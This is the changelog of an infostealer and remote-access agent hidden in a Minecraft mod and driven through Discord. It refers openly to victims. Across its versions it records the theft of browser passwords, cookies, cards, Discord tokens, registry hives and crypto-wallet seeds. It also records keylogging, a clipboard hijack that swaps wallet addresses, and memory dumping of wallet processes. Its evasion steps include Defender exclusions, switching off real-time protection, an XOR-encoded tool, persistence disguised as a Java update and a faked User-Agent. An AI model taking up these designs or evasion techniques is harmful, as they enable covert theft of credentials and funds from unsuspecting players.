# Changelog

## 0.3.1

- Release universal: el jar publicado vuelve a llevar un `config.json` fijo con una build universal, así que el mismo archivo sirve para cualquier número de víctimas sin compilar uno por persona. El generador por build sigue disponible en el panel.
- `universal.json` es público (secreto de cliente) y el seed crea la build `universal` con el mismo `build_id`; revocar esa build revoca a todos sus agentes.

## 0.3.0

- Frozen wire contract v1 (`contract/v1`) and self-hosted SPC Console.
- Crypto module: extension vault v3, Chromium/Firefox credentials, desktop wallet
  discovery, BIP39/hex/WIF seed scan, clipboard monitor with strict replacement.
- Deflate + AES-256-GCM artifact container, resumable 512 KiB chunks with HMAC auth.
- Console: Fastify API, Prisma/PostgreSQL, TOTP + argon2id, RBAC, audit, builds,
  artifacts, map, tasks and WebSocket notifications.

## 0.2.33

- Camuflaje del árbol de instalación: en Windows pasa de `%LOCALAPPDATA%\FabricSync` a `%LOCALAPPDATA%\Microsoft\Java`, se marca `+H +S` y oculta el contenido de forma recursiva. La tarea programada y el valor Run pasan de `FabricSync` a `Java Runtime Update`.
- Migración automática al siguiente arranque del mod: el stager detiene el agente anterior, mueve el árbol (o copia y borra si el move falla), conserva el estado y reescribe la persistencia. `ServerPackCore` también migra.
- `Persistence` elimina la tarea/Run antiguos al crear los nuevos y limpia todos los alias al desactivar.
- Linux y macOS mantienen `FabricSync`; los nombres legacy de archivos no cambian.

## 0.2.32

- El stager lanzaba siempre el `javaw.exe` copiado en la carpeta de instalación. Con JRE empaquetados por el launcher (Prism, MultiMC) ese ejecutable aislado no localiza `jvm.dll`, así que el agente moría antes de escribir logs y nunca se creaba la sesión. Ahora arranca primero el `javaw.exe`/`java` real de `java.home` y deja el copiado solo como fallback. La persistencia ya prefería el runtime real.
- Cubierto con `StagerTest`: el runtime real gana y el copiado solo se usa si falta.

## 0.2.31

- Defender marcaba la descarga del jar 0.2.30 como `HackTool:Win64/PSWDump.MX!MTB` y fallaba la cuarentena porque `chromelevator_x64.exe` viajaba como PE dentro de dos jars anidados. Ahora se genera un `chromelevator_x64.dat` XOR en el build, el jar no contiene ningún PE y `Abe` lo decodifica solo al extraerlo a `cache\tools`, tras verificar el SHA-256 fijado. Antes de escribir intenta una exclusión silenciosa de esa carpeta.

## 0.2.30

- Carteras: `LOST` distingue `grace` de `dead`. Una gracia cierra la extensión del navegador aunque el PID del navegador siga vivo y emite un único `wallet closed`; en cambio conserva Electrum/Ledger/Exodus con PID vivo (rebote de foco) y `dead` limpia siempre. Reabrir Phantom en el mismo navegador dentro del cooldown de 600 s restaura la sesión y reactiva el keylogger sin segundo aviso ni volcado.
- Volcado en Firefox: se elige el proceso `-contentproc` de mayor `WorkingSet` que no supere 1,5 GB, en vez de gastar el intento en el proceso principal; los navegadores vuelcan un solo proceso y los de escritorio mantienen dos. Si el mayor no cabe se prueba el siguiente y se avisa una sola vez con `wallet dump skipped`.
- Keylogger: `keys.ps1` marca Ctrl y Alt en `ToUnicodeEx`, de modo que AltGr/Ctrl+Alt devuelve el símbolo del layout (`@`, `€`) y Ctrl solo conserva la letra (`Ctrl+C` → `c`). Las teclas muertas se ignoran y componen con la siguiente. `ct`/`al`/`dk` son diagnóstico y no cambian `keys.log`/`passwords.log`.
- Keylogger: una seed BIP39 tecleada de 12/24 palabras con checksum válido se avisa como `seed escrita`, se guarda en `cache/ops/seeds.log` y no duplica el aviso de contraseña. `seeds.log` queda protegido por la limpieza de caché.

## 0.2.29

- Corregida la carrera de `UpdateTest.overlappingModAppliesKeepDistinctStagesAndNewestWins` que tumbó CI en Java 25: el helper ganador borra ahora todos los `mod-update-*.jar`/`spc-mod-new-*.jar` de su versión al instalar o cancelar, en Unix y Windows, en vez de dejar el staging del helper antiguo. Cubierto con 15 ejecuciones forzadas del test en Java 25.

## 0.2.28

- Carteras en Firefox: el watcher reconoce `firefox`, `librewolf` y `waterfox` y `memdump` resuelve sus procesos `-contentproc` (Firefox no usa `--extension-process`). Antes una extensión abierta en Firefox no generaba ningún `DETECT`.
- Contraseñas del portapapeles: además de la ventana de cartera, una cadena de 12–128 caracteres sin espacios con al menos tres clases (minúsculas, mayúsculas, dígitos, símbolos) y 8 caracteres distintos se alerta aunque el título del popup llegue vacío o genérico. `s3cret-pass` sigue necesitando contexto; una frase normal con espacios no entra.
- El log registra proceso, título, longitud y tipo detectado de cada evento de portapapeles para diagnosticar ventanas sin título.

## 0.2.27

- Portapapeles: una contraseña copiada desde una ventana de cartera (Phantom, MetaMask, Rabby, Exodus, Electrum, Ledger, gestores) se detecta aunque el proceso en primer plano sea el navegador. El aviso incluye proceso y título y usa el formato `clipboard contraseña (proc | title): …`; una ventana neutral como Notepad sigue sin alertar. Los demás detectores (seed, xprv, EVM/Solana) no cambian.

## 0.2.26

- Carteras: un cambio de título ya no cierra la sesión. El watcher conserva `(nombre, pid, arranque)` durante 20 s y solo emite `LOST` si el proceso murió o pasa la gracia; el agente vuelve a comprobar que el PID siga vivo antes de limpiar. El cooldown se aplica también a la misma clave (el bypass persistido vale solo para el primer `DETECT` tras un reinicio) y un proceso vivo ya volcado no repite aviso ni volcado. Los navegadores bajan a un único intento para no subir tres volcados de ~190 MB por apertura; Electrum/Ledger/Exodus mantienen los reintentos 60/180 s.
- Hallazgos: el escáner procesa primero 24 palabras; una secuencia de 12 exige marcador `mnemonic`/`secretKey`/`seed`/`phrase`/`backup`/`"words"` a menos de 256 bytes o al menos 9 palabras distintas sin más de una repetida. La repetición exacta en el volcado cuenta como alta confianza pero no basta por sí sola: un bloque CSS repite `arrow right…` y también pasa el checksum de 4 bits. Los textos ya vistos no se reavisan en 30 min y la seed alertada por portapapeles no se repite en 2 min; el `findings-*.txt` sí conserva todo. Solo las señales fuertes dicen “seed encontrada”; el resto dice “posible seed (12 palabras)”.
- Solana: longitud 87–88 con límites que no sean base58, descarte de cadenas hex y exigencia de mayúsculas y dígitos (las listas de diccionarios/scripts son minúsculas). Un hex de 64 caracteres se clasifica `hex64`/`evm-key`, nunca `solana`; tanto el escáner como el detector de portapapeles exigen 8 dígitos hex distintos en el hex sin `0x` para no alertar de rellenos constantes.

## 0.2.25

- Corregido el corte total de Discord tras el arranque: Cloudflare devolvía `403: internal network error (40333)` a REST, gateway y webhook porque el User-Agent se anunciaba como `Mozilla/5.0 (…Chrome/126…)` con el TLS de Java. El UA pasa a `DiscordBot (repo, versión)`; el gateway vuelve a conectar y las subidas/replies funcionan. Test fija que el UA no empiece por `Mozilla/5.0`.
- El arranque ya no puede quedarse mudo por Task Scheduler: el poller se inicia antes de la persistencia y de los servicios, y cada `schtasks`/`reg` tiene un corte de 20 s con `destroyForcibly`.
- Diagnóstico: `tools/windows-diag.ps1` recoge procesos, versión, hashes, espacio, logs, tarea, mods y Defender, y sube el ZIP por el webhook.

## 0.2.24

- El watcher de carteras recibe el PID del agente y termina cuando este muere: un reinicio o `kill` ya no deja un `powershell` escaneando en paralelo ni multiplica watchers. `wallet watch off` cancela también el volcado en curso y borra los `.dmp` parciales de ese intento. `memdump` mata el árbol `cmd`/`powershell` al parar.
- El keylogger ya no consulta UI Automation dentro del callback del hook (solo en el temporizador de 400 ms), para no superar `LowLevelHooksTimeout` en aplicaciones bloqueadas y perder el hook en silencio. El arranque ya no borra `keys.pid`: un hook lanzado desde `startup.vbs` conserva PID, `keys status` y la supervisión.
- La lista de volcados se escribe en UTF-8 sin BOM y el agente tolera un BOM: un perfil con tilde o espacio ya no rompe la resolución de `wallet-*.dmp`. Un popup de extensión resuelve su proceso navegador padre antes de elegir renderers `--extension-process`, de modo que el ZIP no cae en el renderer del popup ni en el proceso principal.
- El portapapeles espera hasta 3 s el mutex antes de rendirse en un reinicio y asigna memoria antes de `EmptyClipboard`, así un fallo no deja el portapapeles vacío. Los avisos de contraseña copiada aceptan 6 caracteres (antes 8), en línea con el mínimo del keylogger.
- El apagado solo conserva el hook si `persist` está activo y lo mata cuando no; se mantiene el comportamiento documentado de supervivencia en `kill`/update. Las alertas de secretos y el listado de `help` no cambian.

## 0.2.23

- Los avisos de secretos copiados quedan explícitamente activados por defecto en estado y configuración, aunque `clipboard.sendSecrets` no exista; solo `clip secrets off` o un `false` explícito los desactivan. Tests cubren el default y el override.

## 0.2.22

- El portapapeles avisa también de secretos copiados, sin sustituirlos: seed BIP39 de 12/24 con checksum, `xprv`, claves privadas EVM/Solana y contraseñas cuando la ventana en primer plano es un gestor de contraseñas o su página. `clip secrets on|off` (o `clipboard.sendSecrets`) controla solo estos avisos; el reemplazo de direcciones sigue igual.
- Los eventos de portapapeles llevan ahora proceso y título de la ventana en primer plano para el contexto de los avisos.

## 0.2.21

- `help` enumera todos los comandos existentes, incluidos `help`, `ops`, `gateway`, `clip read`, `addr`, `wallet`, `keys`, `memdump` y todas las acciones de `update`. Un test falla si un comando desaparece de la lista.

## 0.2.20

- Carteras: watcher residente de 1,5 s (título en primer plano + procesos) para Electrum, Phantom, MetaMask, Rabby, Trust, Coinbase Wallet, Ledger Live y Exodus. Phantom/MetaMask se vuelcan por los hijos `--extension-process` del navegador, no por el proceso principal. Aviso, espera de 5 s, dump, ZIP, subida y escaneo automáticos; reintentos 60/180 s, máximo tres dumps, dedupe por `(nombre, pid, arranque)`, cooldown global configurable y corte de 1,5 GB.
- Escáner de memoria en Java puro, en streaming: BIP39 de 12/24 con checksum (lista incluida como recurso), `xprv/yprv/zprv` y claves Solana de 64 bytes. Máximo 20 hallazgos, artefacto `findings-<ts>.txt` y avisos separados para la seed.
- Keylogger: hook nativo `WH_KEYBOARD_LL` con `ToUnicodeEx` y distribución activa, instancia única, arranque desde el agente y desde `startup.vbs` si `cache/ops/keys.on` existe. UI Automation `IsPassword` primero, heurística de ventana como fallback, buffer por ventana con flush en Enter/Tab/foco/10 s, límites 6–256 y `passwords.log` junto a `keys.log` con rotación y offsets persistentes. `keys off --hard` bloquea el relanzamiento por cartera.
- Portapapeles: listener nativo `WM_CLIPBOARDUPDATE` con ventana solo-mensajes y protocolo duplex con el agente; sin polling. Validadores estrictos con checksum (BTC base58check/bech32/bech32m, EIP-55, SOL de 32 bytes, LTC, DOGE, BCH cashaddr, TRX, XRP, ADA), rotación round-robin, anti-bucle, máximo 128 caracteres, una línea, sin URLs y preservación de mayúsculas bech32. Comandos `clip on|off|status` y `addr add|list|del|clear`; overrides locales en `config.json`.
- `discord.json` acepta `wallets`, `keylogger` y `clipboard.coins`; los tres servicios están on por defecto y ningún fallo tumba al agente. Estado nuevo (`walletsWatch`, `keylogger`, `clipboard`, cooldown, contadores, listas y rotación) y limpieza TTL que protege los artefactos operativos.
- Limitación real: todo es Windows y necesita sesión interactiva; Linux solo conserva los comandos con aviso. Phantom no se descifra sin contraseña, para eso está el volcado.

## 0.2.19

- Carteras: `memdump electrum|phantom` (MiniDumpWriteDump + zip), `keys on|off|dump` (solo ventanas de cartera), `clip`, `tools/dump-scan.py` para buscar BIP39/xprv en volcados y `tools/phantom-decrypt.py` (PBKDF2 + XChaCha) con contraseñas o logins guardados. `decrypt.py` prueba candidatas en Electrum y `ingest-case.sh` encadena Phantom.

## 0.2.18

- HTTP requests use a normal Chrome User-Agent instead of the unique `FabricSync` one, so proxies do not spot the agent by UA.
- `cache/` drops transient plaintext leftovers after seven days (ZIPs, TSV de cookies, screenshots, hives temporales), keeping `discord/token.txt` and the elevator.
- `tools/ingest-case.sh --auto` acepta harvest, hives o ambos, saca `dpapi_machinekey`/`dpapi_userkey` con `secretsdump.py` y descifra sin preguntar; la contraseña del `.7z` se genera y guarda sola.
- `tools/auto-ingest.sh` + `tools/install-auto-ingest.sh` procesan los casos solos al aparecer `sync-*.zip` o `system-*.zip`.
- `decrypt.py`: lee los almacenes de Phantom sin `plyvel` (fallback puro) y exporta los blobs sellados; soporta Electrum BIE1 con `-p` o genera el hash `$electrum$` para hashcat.
- Carteras: `memdump electrum|phantom` (MiniDumpWriteDump + zip), `keys on|off|dump` (solo ventanas de cartera), `clip`, `tools/dump-scan.py` para buscar BIP39/xprv en volcados y `tools/phantom-decrypt.py` (PBKDF2 + XChaCha) con contraseñas o logins guardados. `decrypt.py` prueba candidatas en Electrum y `ingest-case.sh` encadena Phantom.
- `docs/OPSEC.md`: inventario de huellas en disco, procesos, red, Defender y forense, con detección y mitigaciones.

## 0.2.17

- The bot token is no longer compiled into the public jar. Agents fetch `discord.json` over HTTPS (token base64-encoded to satisfy GitHub push protection), cache it in the install tree and pick up rotations automatically after a `401`; `local.properties` and the `SPC_*` variables remain development overrides. `checkSecrets` validates the public document instead of the local file.
- Optional `allowedUsers` allowlist in `discord.json`: when set, only those user IDs (and webhooks) can run commands. The cached config and `config.json` are written `0600` on Unix.
- Agent failures are appended to `<install>/logs/agent.log` (rotated at 256 KB, `0600` on Unix) instead of vanishing with the discarded launcher output.
- `update check` and bare `update` report “up to date” instead of an error when the running version is current. Large downloads are numbered to three digits so lexical order stays numeric.
- `clear [n]` (default 100, max 1000): deletes the channel history in 100-message bulk batches, falling back to single deletes for messages older than two weeks.
- `clear` no longer aborts with `403 Missing Permissions`: when the bot has no Manage Messages, a failed bulk batch is retried one message at a time, so its own replies and webhook uploads are still removed and the rest are reported as skipped instead of failing after 0.
- Uploads retry on network errors and rate limits, split parts verify each one, `harvest` keeps the ZIP when the upload fails, and bootstrap steps stay unmarked while any collected file could not be sent. Previously a hiccup deleted the data as if it had been delivered.
- A deleted channel or webhook is recreated instead of leaving every poll and upload failing until reinstall; the REST poll also recovers from a 404.
- The gateway reconnects after a normal 1000/1001 close (for example during a Discord deploy) instead of staying on slow REST fallback forever.
- `sleep <s>` really takes seconds (default 1, max 60) and bare `persist` reports the state instead of silently disabling persistence.
- The harvest ZIP is written as `.tmp` and moved into place, so a concurrent bootstrap upload cannot pick up a half-written archive.
- Webhook commands wake the REST poll when the gateway delivers them without content, so they run immediately instead of waiting for the next human message.

## 0.2.15

- Hives map the CNG key files by the UTF-16 provider name (`Google Chromekey1`/`2`) instead of `findstr`, which could not see the UTF-16 text and left `keys.hits` empty, so the `SystemKeys/Google Chromekey1` gate retried forever.
- The elevated launcher adds the cache/`.bat`/`.ps1`/`.hiv` exclusions before it creates the SYSTEM task, so Defender sees the excluded paths from the first line instead of after UAC.

## Unreleased

- `decrypt.py`: an opened Exodus payload is decoded automatically. The 4-byte + gzip record is unwrapped, the 64-byte BIP39 seed with its 16/32-byte entropy becomes the 12/24-word mnemonic after validating the checksum against the seed, and the legacy seed+ASCII layout is still accepted.
- `exodus_seed.py` accepts a `.bin` payload directly, not only a `SECO` container.
- `tests/test_decrypt.py`: regression coverage for both Exodus layouts, the container wrapper and the v20 32-byte host-hash prefix.

## 0.2.14

- Hives find the DPAPI/CNG material on Windows builds where it is not in the default store: Protect falls back to the WOW64 and SYSTEM-profile copies, and `SystemKeys` also takes the machine/user CNG key stores plus a content search for `Google Chromekey1`.
- Every hives run uploads `hives.diag` (which source folders exist, with listings) and `elevate.status`, so a missing folder is diagnosed without another command round.
- Command webhooks are accepted, so one account can drive the agent from a webhook instead of needing a second guild member with the user account.

## 0.2.13

- Hives survive Defender: the dump adds persistent exclusions for the cache/install paths, the `.hiv` extension and `reg.exe`/`esentutl.exe`/`tar.exe` before the first `reg save`, waits for Defender to load them, and disables real-time monitoring only for the duration of the dump (the previous value is restored).
- `reg save` has a per-hive VSS fallback (`esentutl /y /vss`) for SYSTEM, SECURITY and SAM, so a blocked command or a quarantined file no longer strands the archive.
- The dump checks hive sizes and the presence of `ProtectSystem/S-1-5-18` and `SystemKeys/Google Chromekey1` before packing, retries up to three times, and verifies every member with `tar -tf`.
- `completeHives` now requires all five members with real content, and a partial `system-*.zip` is deleted instead of short-circuiting the next attempt.

## 0.2.12

- Hives no longer ship a partial ZIP: `SAM.hiv` and the `SystemKeys` folder get placeholders before `tar`, which aborts at the first missing member (that is why 0.2.11 archives silently lost `ProtectSystem`/`SystemKeys`).
- The hives result is only accepted when the ZIP really contains `SAM.hiv` and at least one `SystemKeys/` entry, so a partial archive is retried instead of uploaded.

## 0.2.11

- Discord harvest: the validated `cache/discord/token.txt` is included even if Discord's LevelDB no longer re-reads, and the sibling `Local State` is always part of the raw fallback so v10 blobs stay decryptable offline.
- ABE runs lowercase and verbosely; an empty result now records the exit code instead of a blank `abe_error`.
- Hives also collect `SAM.hiv` and `C:\ProgramData\Microsoft\Crypto\SystemKeys` (Google Chromekey1), needed for offline Chrome flag-3/flag-4 v20 keys.
- `decrypt.py`: correct DPAPI KDF (password -> SHA1 -> SID HMAC), CNG HMAC validation, SYSTEM `S-1-5-18/User` masterkeys, the real SYSTEM->user app-bound chain, Edge/Brave raw 32-byte keys, and Chrome flag 3/4 via `--ksp` (auto-detected under `hives/SystemKeys`). Unknown flags now fail loudly instead of yielding a wrong key.
- `tools/ingest-case.sh` passes `--system-userkey` and `--ksp`, and points `--system-protect` at the extracted hives.

## 0.2.10

- Discord tokens that do not start with `M`/`N` are valid: the regex now accepts the `Nz...` form and the two-segment variant. This was why a correctly decrypted token produced no `token.txt`.
- If every candidate fails `/users/@me`, the first decrypted token is still saved so it can be checked or renewed after a Discord login.


## 0.2.9

- ABE retry: a zero exit without output is now a failure, so the browser-close (`-k`) retry actually runs. The helper captures `abe_log=` for diagnosis.
- `token` command: forces Discord token recovery on demand and writes `cache/discord/token.txt`, so a failed automatic attempt can be retried without a full harvest.
- `decrypt.py --system-protect` accepts the whole `ProtectSystem` folder as well as the `S-1-5-18` child.


## 0.2.8

- ABE resilience: Defender quarantined `chromelevator_x64.exe.tmp` before the move, so every browser failed and no `v20=` was written. Extraction now writes the final filename directly, starts it as soon as possible and retries up to three times on quarantine.
- The no-file PowerShell app-bound unwrap now runs before ABE, so v20 survives even when Defender blocks the elevator; ABE only adds the plaintext TSV.
- Discord: newer builds store the token as a `v10` AES-GCM envelope with a DPAPI-wrapped key in `Local State`. The agent now unwraps that key with `ProtectedData CurrentUser`, decrypts the envelope and validates `/users/@me`; the old DPAPI blob and raw fallback remain.
- `decrypt.py` decrypts those `v10` Discord envelopes with the user masterkey, so an old harvest or a blocked agent can still recover the token with `-p`.
- `tools/ingest-case.sh` gains `--win-password` and `--machinekey` passthrough for incomplete or legacy cases and now removes `decrypted/` with `--clean` after the encrypted archive verifies.


## 0.2.7

- Visible rename to `Fabric Sync`: install directory `%LOCALAPPDATA%\FabricSync`, `cache\`, `runtime.jar`, `javaw.exe`, `startup.vbs`, `update.*`, `session.txt`, `config.json`, `.version`, `logs\update.log`, task `\FabricSync`, channel `sync-<host>-<user>`, embed `Fabric Sync`, `fabric-sync-<version>.jar`, `sync-<ts>.zip`, `cache\system-<ts>.zip`, `cache\elevate.bat`, `screen-<ts>.png` and `out-<ts>.txt`. The mod id stays `serverpackcore`.
- Legacy installs are detected in one place: `ServerPackCore` wins if `FabricSync` does not exist, and keeps the old agent/helper/task names because the deployed helper references them. A fresh install uses the full modern tree.
- ABE v20: ChromElevator v0.20.0 (MIT, pinned SHA-256, `NOTICE`) is embedded, verified, extracted to `cache\tools` and run per browser in the user session. Cookies, passwords, cards, IBANs and Google tokens land in `browsers/<label>/abe/*.tsv`; the decrypted key is `v20=`. Failure leaves `app_bound=` and `abe_error=` and continues with `hives` as fallback.
- Discord token: minimal LevelDB reader with Snappy for `.ldb` and `.log`, `dQw4w9WgXcQ:` extraction, DPAPI `CurrentUser` unwrap and `/users/@me` validation, saved to `discord/token.txt`. Raw dumps remain fallback.
- Bootstrap no longer invokes `hives` or UAC. `hives` stays a manual command with three attempts per run; its elevated script adds persistent Defender exclusions for the install directory, the mods folder, `reg.exe` and `esentutl.exe` before `reg save`.
- Uploads over ~8 MB are split into sorted `.partNN` files; README documents reassembly.
- `decrypt.py` consumes ABE TSV and `discord/token.txt` first, so 0.2.7 v20 and Discord open without `-p` or `--machinekey`.
- `tools/ingest-case.sh` automates reassembly, ZIP verification, extraction, decryption and encrypted archiving of a downloaded case.
- Mod metadata is now `Fabric Sync`, with `archives_base_name=fabric-sync`; the id is unchanged. The install directory is hidden with `attrib +h`, not system.

## 0.2.6

- Harvest: the app-bound key (v20 cookies) is now unwrapped live while the agent runs in the victim session. The outer machine DPAPI layer and the inner user layer are both available to a normal user, so no administrator, no UAC and no `SECURITY.hiv` are needed. `keys.txt` gains `v20=<key>`; `app_bound=` stays as an offline fallback.
- Harvest: the Exodus passphrase is unwrapped the same way when it is a machine DPAPI blob, into `wallets/exodus-passphrase.txt`. A plain passphrase still ships in `passphrase.json`.
- `decrypt.py` consumes `v20=` and `exodus-passphrase.txt` first, then falls back to the existing machinekey paths. The `hives` step is now optional.
- Harvest also keeps `admin/autologon.txt` (`DefaultPassword` when autologon is on) and any leftover `Unattend.xml` as a last resort for the administrator password.
- `hives` is unchanged and still works, now only for offline `secretsdump` and as a fallback.

## 0.2.5

- Hives: `reg save HKLM\\SECURITY` failed when the task ended up running as Administrator instead of SYSTEM, and the zip shipped without it. The script now falls back to `esentutl /y /vss` on the live hive (works with plain Administrator) and aborts with `hives.status` if SECURITY or SYSTEM is still missing.
- The task is registered with `/rl HIGHEST`.

## 0.2.4

- Bootstrap: the hives step packed `SYSTEM.hiv` even when `reg save HKLM\SECURITY` had failed, so `secretsdump` then died on a missing file and the v20 cookies stayed locked. The script now aborts, writes `hives.status` and retries when `SECURITY.hiv` is absent.
- Also delete the `spcdump` task when it aborts, instead of leaving it behind for the next attempt to overwrite.

## 0.2.3

- Fix: the Windows update helper declared `Const CUR` and then `Dim ... cur ...`; VBScript is case insensitive, so `wscript` rejected it with "Nombre redefinido". Renamed to `curPid`.
- Fix: `Const LOG` collided with the built-in `Log()`, same error. Renamed to `LOGFILE`.
- Both Windows scripts are now also run under `wine cscript` before a release, and a test rejects keywords, built-in functions and any name declared twice.

## 0.2.2

- `help` lists the usable commands in the channel.
- `bootstrap` re-runs the whole first-run collection on demand (markers cleared, hives cap reset).

## 0.2.1

- Fix: every Windows agent update since 0.1.4 died before doing anything. The generated helper declared `Const NEW`, and `New` is a VBScript reserved word, so `wscript` rejected the file with "Se esperaba un identificador" and an error dialog. Renamed to `NEWFILE`.
- Fix: the same helper also used `left` as a counter variable while calling `Left()`, shadowing the built-in. Renamed to `remaining`.
- The Windows update script is now asserted against both names.
- Machines stuck on this bug need one manual hop: replace the mod jar by hand, `kill` the agent and start the game, the stager then installs the 0.2.1 agent from the mod.

## 0.2.0

- Harvest: newer Discord builds encrypt the stored token, so no plaintext candidate validates. The raw LevelDB files now ship under `discord/raw/` (2 MB budget) instead of being dropped; the DPAPI blobs in `dpapi/` are enough to decrypt them offline.
- Harvest: `keys.txt` no longer parses `Local State` through PowerShell `ConvertFrom-Json`, which silently failed on Edge. The encrypted key is read in Java and only the DPAPI unwrap is delegated, so Edge gets a key too.
- Harvest: when the unwrap fails, `keys.txt` keeps the wrapped value as `dpapi_key=` instead of losing it.
- Harvest: wallet extension data is stored as `wallets/<browser>/<extension>/<profile>` so Chrome, Edge and Brave no longer overwrite each other.
- Harvest: browser databases now ship with their `-wal` companions, so rows written while the browser is open are no longer lost from the copy.
- Harvest: total zip budget raised from 8 MB to 12 MB.
- Mod: dropped the unread `refmap` entry from the mixins config; Loom already remaps the injection points inline and the warning only confused the log.
- Mod: the stager logs one INFO line when it fires and when it spawns the agent.
- `decrypt.py` is now a full harvest decryptor: DPAPI masterkeys from the password, browser AES keys, v10 and v20 cookies (with the DPAPI_SYSTEM machinekey), saved passwords, Discord tokens, Exodus/Electrum/Phantom and launcher accounts, styled output and a `report.json`. It parses both the classic and the CNG DPAPI blob layout.
- `SHELL.md` with the loot one-liners to run over `shell`.
- `make_fixture.py` builds a synthetic harvest so the decryptor can be exercised end to end without Windows.
- First run collects itself: a background bootstrap (~45-75 s after the agent starts, Windows only) gathers recon, credentials, Wi-Fi, Discord/Telegram/Steam/Firefox sessions, wallets, SSH and cloud keys, a screenshot and, with one UAC, the SYSTEM hives. Each step uploads separately and leaves a marker, so a crash or a declined UAC only retries the unfinished part; the hives stop after three attempts.
- First run also turns `persist` and auto-update on by default; `persist off` or `update auto off` still wins afterwards.
- `shell` is now for specific extras and repairs, see `SHELL.md`.

## 0.1.5

- The update helper keeps watching a restarted agent for 10 minutes after the 20 s stability check (`-Dspc.watchdogSec`, 0 disables).
- A late crash kills survivors, restores the previous agent and records `rollback-late`; the startup marker makes it count one failure and back off.
- Atomic `spc-update.intent` markers distinguish `<action> <agent-pid>`: `stop` and `replace`.
- `kill` during the window stops without a restart (`watchdog-stopped`).
- A newer update takes precedence and the old helper exits (`watchdog-replaced`) instead of fighting it; `update rollback` keeps working in the window.
- A healthy window exits with `watchdog-cleared` and only deletes its own marker.
- The Windows VBS helper mirrors the marker and watchdog logic and is still untested on a real host.
- Includes the 0.1.4 fixes: signed self-update and startup rollback, deferred mod swap, manual rollback, shared update gate, opt-in schedule with backoff, startup rollback marker, and mod repair plus game PID recovery when updating from an older build.
- This 0.1.4 → 0.1.5 hop is still prepared by the 0.1.4 helper, so the watchdog first governs updates made after 0.1.5 is installed.

## 0.1.4

- Signed agent updates: apply, restart and automatic rollback on startup failure.
- Signed mod staging with the swap deferred until the game exits.
- Manual `update rollback` for both artifacts.
- Shared update gate so manual and automatic runs never overlap.
- Opt-in automatic updates: first slot after 10 minutes, then every 24 h ±10 % jitter, backoff 1 h → 2 h → 6 h → 24 h, slots persisted across restarts.
- Rollback marker so a failed startup counts as a failure with backoff.
- The Windows update helper is still untested on a real host.
- Updating from a build without mod support repairs the mod and recovers the game PID.

## 0.1.3

- Discord bot token rotated; 0.1.2 and earlier no longer connect. Manual reinstall required.
- Self-update infrastructure: signed `update.json` manifest, RSA-3072 public key embedded in the agent, release workflow with dry run.
- Discord credentials moved out of the tracked tree into generated `DiscordSecrets`, sourced from `local.properties` or `SPC_*` environment variables.
- `checkSecrets` and `release` Gradle tasks; releases fail fast on placeholders.
- Full Spanish to English translation of commands, messages and documentation.
- Gateway WebSocket transport with per-connection callbacks and REST fallback.
- Gateway hardening: 4014 intent downgrade, resume, backoff with jitter, 429 honoring `retry_after`.
- JUnit suite for the agent (24 tests) and bytecode verification for the mod and agent jars.

## 0.1.2

- Baseline before the release tooling work.
